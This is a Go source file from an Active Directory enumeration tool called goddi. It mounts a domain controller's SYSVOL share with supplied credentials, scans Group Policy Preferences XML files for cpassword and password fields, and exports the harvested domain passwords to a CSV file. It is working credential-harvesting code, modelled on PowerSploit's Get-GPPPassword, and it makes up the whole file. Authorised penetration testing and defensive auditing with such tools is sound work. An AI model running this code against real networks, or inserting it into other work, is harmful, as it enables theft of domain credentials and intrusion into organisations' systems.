// +build !windows

package goddi

import (
	"fmt"
	"log"
	"os"
	"os/exec"
	"runtime"

	"gopkg.in/ldap.v2"
)

// GetGPP grabs all GPP passwords
// Reference: Scott Sutherland (@_nullbind), Chris Campbell (@obscuresec)
// https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1
func GetGPP(conn *ldap.Conn, baseDN string, dc string, user string, pass string) {

	fmt.Printf("[i] GPP enumeration starting. This can take a bit...\n")

	var filepaths = []string{
		`/Machine/Preferences/Groups/Groups.xml`,
		`/User/Preferences/Groups/Groups.xml`,
		`/Machine/Preferences/Services/Services.xml`,
		`/User/Preferences/Services/Services.xml`,
		`/Machine/Preferences/Scheduledtasks/Scheduledtasks.xml`,
		`/User/Preferences/Scheduledtasks/Scheduledtasks.xml`,
		`/Machine/Preferences/DataSources/DataSources.xml`,
		`/User/Preferences/DataSources/DataSources.xml`,
		`/Machine/Preferences/Printers/Printers.xml`,
		`/User/Preferences/Printers/Printers.xml`,
		`/Machine/Preferences/Drives/Drives.xml`,
		`/User/Preferences/Drives/Drives.xml`}

	attributes := []string{
		"filepath",
		"username",
		"cpassword",
		"password",
		"changed",
		"newname"}

	csv := [][]string{}
	csv = append(csv, attributes)
	mntpoint := "/mnt/goddi/"

	existMount(mntpoint)
	checkMount(mntpoint)

	var fsType, mntopt, address string
	switch os := runtime.GOOS; os {
	case "darwin":
		fsType = "smbfs"
		address = fmt.Sprintf(`//%s;%s:%s@%s/sysvol/`, baseDN, user, pass, dc)
	default:
		fsType = "cifs"
		address = fmt.Sprintf(`//%s/sysvol/`, dc)
		mntopt = fmt.Sprintf(`user=%s,password=%s,vers=3.0`, user, pass)
	}

	_, err := mountCmd(fsType, mntopt, address, mntpoint)

	if err != nil {
		log.Fatal(err)
	}

	list := getSubDirs(mntpoint)
	gpodomain := list[0]
	policypath := mntpoint + gpodomain + `/Policies`

	var xmlfiles = []string{}

	policydirs := getSubDirs(policypath)
	for _, subdir := range policydirs {
		for _, path := range filepaths {
			fullpath := policypath + `/` + subdir + path
			if _, err := os.Stat(fullpath); !os.IsNotExist(err) && !os.IsPermission(err) {
				xmlfiles = append(xmlfiles, fullpath)
			}
		}
	}

	csvptr := &csv
	for _, file := range xmlfiles {
		parseXML(file, csvptr)
	}

	fmt.Printf("[i] GPP passwords: %d found\n", len(csv)-1)
	writeCSV("Domain_Passwords_GPP", csv)

	_, errs := removeUnix(mntpoint)
	if errs != nil {
		log.Fatal(errs)
	}

}

// Check if mount exists
func existMount(mntpoint string) {
	// if /mnt/goddi does not exist, mkdir the directory
	if _, err := os.Stat(mntpoint); os.IsNotExist(err) {
		os.Mkdir(mntpoint, os.ModePerm)
		fmt.Println("[i] /mnt/goddi mount point created...\n")
	}
}

// Check if mount point is mounted
func checkMount(mntpoint string) {

	if len(getSubDirs(mntpoint)) != 0 {
		fmt.Printf("[i] /mnt/goddi mounted, unmounting now...\n")
		_, err := removeUnix(mntpoint)
		if err != nil {
			log.Fatal(err)
		}
	}
}

// mountCmd maps a unix/darwin share
func mountCmd(fsType, option, address, mntpoint string) ([]byte, error) {
	return exec.Command("mount", "-t", fsType, "-o", option, address, mntpoint).CombinedOutput()
}

// Remove a unix share
func removeUnix(mntpoint string) ([]byte, error) {
	return exec.Command("umount", mntpoint).CombinedOutput()
}
